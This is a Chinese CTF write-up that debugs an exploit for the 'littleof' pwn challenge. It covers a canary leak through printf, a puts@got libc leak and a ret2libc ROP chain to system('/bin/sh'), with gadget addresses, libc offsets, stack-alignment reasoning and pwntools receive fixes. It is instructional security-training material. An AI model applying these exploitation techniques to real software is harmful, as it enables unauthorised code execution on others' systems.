# [2021 鹤城杯] littleof — EXP 排查笔记

## 题目信息

- **平台**: NSSCTF
- **题目**: littleof (鹤城杯 2021)
- **环境**: Ubuntu 18.04 / GLIBC 2.27 (libc6_2.27-3ubuntu1.3_amd64)
- **保护**: NX enabled, Stack Canary, No PIE, Partial RELRO
- **漏洞**: 栈溢出 (read 0x100 字节到 0x50 大小的缓冲区)
- **利用**: 泄露 canary → 泄露 libc → ret2libc getshell

## 排查流程

### 第一步：审计二进制

```bash
objdump -d ./pwn
strings ./pwn
readelf -S ./pwn
readelf -l ./pwn
ROPgadget --binary ./pwn
```

确认了以下关键地址和逻辑：

| 项目 | 地址/值 |
|------|---------|
| `pop rdi; ret` | `0x400863` |
| `ret` (栈对齐) | `0x40059e` |
| main 函数 | `0x400789` |
| 漏洞函数 | `0x4006e2` |
| `puts@plt` | `0x4005b0` |
| `puts@got` | `0x601018` |
| 缓冲区大小 | `0x50` (80 字节) |
| canary 位置 | `rbp-0x8` (buf 偏移 0x48) |
| saved rbp | `rbp` (buf 偏移 0x50) |
| return addr | `rbp+0x8` (buf 偏移 0x58) |

### 第二步：逆向漏洞函数 (0x4006e2)

```c
void vuln() {
    char buf[0x50];           // rbp-0x50
    canary = fs:0x28;         // rbp-0x8
    puts("Do you know how to do buffer overflow?");
    read(0, buf, 0x100);      // 第一次读，溢出点
    printf("%s. Try harder!", buf);  // 可用作 canary 泄露
    read(0, buf, 0x100);      // 第二次读，ROP 利用
    puts("I hope you win");
    if (canary != fs:0x28) __stack_chk_fail();
}
```

### 第三步：审查 EXP 与交互协议

画出服务端与 EXP 的交互时序：

```
服务端                              EXP
  │                                  │
  ├─ puts("Do you know...") ────────►│ (数据到达，未被读取)
  ├─ read(0, buf, 0x100) ◄等待输入   │
  │                                  ├─ sendline('a'*0x48)  [覆盖 canary LSB]
  ├─ printf("%s", buf) ─────────────►│ 'a'*0x48 + \x0a + canary[1:8] + ". Try harder!"
  ├─ read(0, buf, 0x100) ◄等待输入   │
  │                                  ├─ sendline(ROP chain)
  ├─ [ROP 执行: puts(puts@got)] ────►│ leaked address
  ├─ [ROP 执行: 跳转 main]           │
  ├─ puts("Do you know...") ────────►│
  ├─ read(0, buf, 0x100) ◄等待输入   │
  │                                  ├─ sendline('a'*0x48)  [再次泄露 canary]
  ├─ printf("%s", buf) ─────────────►│
  ├─ read(0, buf, 0x100) ◄等待输入   │
  │                                  ├─ sendline(ROP chain 2)
  ├─ [ROP 执行: system("/bin/sh")]   │
```

### 第四步：定位 Bug

#### Bug 1 — canary 泄露被污染 (致命)

EXP 第一次调用 `cannary_get()` 时，没有先消费服务端一开始就发送的
`"Do you know how to do buffer overflow?\n"`。

`p.recvline()` 期待读到 `'a'*0x48`（printf 输出的第一行），实际却读到了
`"Do you know how to do buffer overflow?"`。随后的 `p.recv(7)` 读到的是
printf 输出的前 7 个 `'a'` 字符，而非 canary 的后 7 字节。

**结果**：`canary_` 变量被赋值为 `u64(b'aaaaaaa\x00')` = 完全错误的 canary，
ROP 链中的 canary 不匹配，`__stack_chk_fail` 被触发，进程崩溃。

第二次调用 `cannary_get()` 同样有问题：泄露的 puts 地址后面的 `\n` 和
"do you know..." 信息没有被消费。

**修复**：在两轮 `cannary_get()` 调用之前，都加上 `p.recvuntil(b'overflow?\n')`。

#### Bug 2 — main_addr 指向漏洞函数体而非 main 函数

EXP 中 `main_addr = 0x4006e2`。这个地址是漏洞函数的第一条指令，而非 main 函数。

地址 `0x400789` 才是真正的 main 函数：
```asm
0x400789: push rbp
          ...
          call setvbuf(stdin, 0, 2, 0)
          call setvbuf(stdout, 0, 2, 0)
          call setvbuf(stderr, 0, 2, 0)
          call 0x4006e2       ; 调用漏洞函数
          pop rbp
          ret
```

ROP 返回到 `0x4006e2` 虽然也能再次触发漏洞，但会跳过 setvbuf 重新初始化。
虽然在第一次运行时 setvbuf 已经设置过（_IONBF 无缓冲），功能上不一定出错，
但按 writeup 惯例和代码整洁性应返回到完整 main。

**修复**：`main_addr = 0x400789`。

#### Bug 3 — LibcSearcher 失败

`LibcSearcher('puts', leak_puts)` 无法匹配到 libc 版本，原因是 canary
泄露出的垃圾导致 `leak_puts` 也是一个无效地址。修复 Bug 1 后，泄露值应该正确。

通过搜索 `libc6_2.27-3ubuntu1.3_amd64.so`（同场赛题 babyof 提供）确认了
正确的偏移，与 EXP 中硬编码的值一致：

| 符号 | 偏移 |
|------|------|
| puts | 0x80aa0 |
| system | 0x4f550 |
| /bin/sh | 0x1b3e1a |

**修复**：添加 try/except 回退机制，LibcSearcher 失败时使用已知偏移。

### 第五步：排查栈对齐

检查了第二段 ROP 链中的 `ret_addr` (0x40059e) 是否必要：

```
进入漏洞函数时:  rsp % 16 == 8  (call 压入返回地址后)
leave 后:       rsp % 16 == 0  (mov rsp,rbp; pop rbp)
ret 后:         rsp % 16 == 8  (pop rip)

无额外 ret:
  pop rdi 后:   rsp % 16 == 0
  ret 后:       rsp % 16 == 8
  system 入口:  rsp % 16 == 0  ← 错误！(应为 8)

有额外 ret:
  ret 后:       rsp % 16 == 0
  pop rdi 后:   rsp % 16 == 8
  ret 后:       rsp % 16 == 0
  system 入口:  rsp % 16 == 8  ← 正确
```

`ret_addr` **必须保留**，否则 system 内部 `movaps` 指令会因栈未对齐而段错误。

### 第六步（第二轮排查）：recvuntil(b'\x7f') 匹配到错误的 0x7f (致命)

在 `p.interactive()` 报 EOF 后重新逐字节追溯数据流，发现了真正的根因。

**数据流细节**：

第一次 `leak_canary()` 的 printf 输出为：
```
'a'*0x48 + \x0a + canary[1:8] + saved_rbp[0:6] + '. Try harder!'
```

`leak_canary()` 只消费了前两部分（`recvline` 拿 `'a'*0x48`，`recv(7)` 拿 canary），
**saved_rbp 和 ". Try harder!" 仍残留在接收缓冲区中**。

然后发送第一段 ROP chain，服务端执行后缓冲区新增：
```
'I hope you win\n' + [puts 泄露 6 字节]\n + 'Do you know...\n'
```

完整缓冲区内容：
```
saved_rbp[0:6] + '. Try harder!' + 'I hope you win\n' + [puts 6 字节]\n + ...
```

**关键问题**：saved_rbp 是一个栈地址（如 `0x7fff12345678`），其字节表示中
第 6 个字节就是 `0x7f`。`p.recvuntil(b'\x7f')` 从缓冲区头部开始扫描，
**首先匹配到的是 saved_rbp 中的 `0x7f`**，而非 puts 地址中的 `0x7f`！

结果：leak_puts 拿到的是一个栈地址，计算出的 libc_base / system / /bin/sh 全部错误，
最终跳转到非法地址导致 SIGSEGV，进程崩溃 → EOF。

**修复**：在 `recvuntil(b'\x7f')` 之前，先消费掉残留数据：
```python
p.recvuntil(b'I hope you win\n')   # 跳过 saved_rbp + '. Try harder!' + 'I hope you win\n'
leak_puts = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))  # 现在正确匹配 puts 的 0x7f
```

**教训**：`recvuntil` 匹配的是缓冲区中**第一个**出现的目标字节，在有栈地址泄露的
场景中必须小心处理残留数据，栈地址的高位字节同样是 `0x7f`。


## 技术要点总结

| 要点 | 说明 |
|------|------|
| canary 泄露技巧 | `sendline` 的 `\n` (0x0a) 恰好覆盖 canary 最低位 0x00，使 printf 打印出后续 7 字节 |
| 协议同步 | 每次交互必须完整消费上一步的输出，否则后续 recv 会错位 |
| 栈对齐 | x86-64 System V ABI 要求 `call` 时 rsp 16 字节对齐；ROP 中用额外 `ret` 滑栈 |
| libc 识别 | 泄露地址低 12 位 (后 3 个 hex) 可唯一确定 libc 版本 |
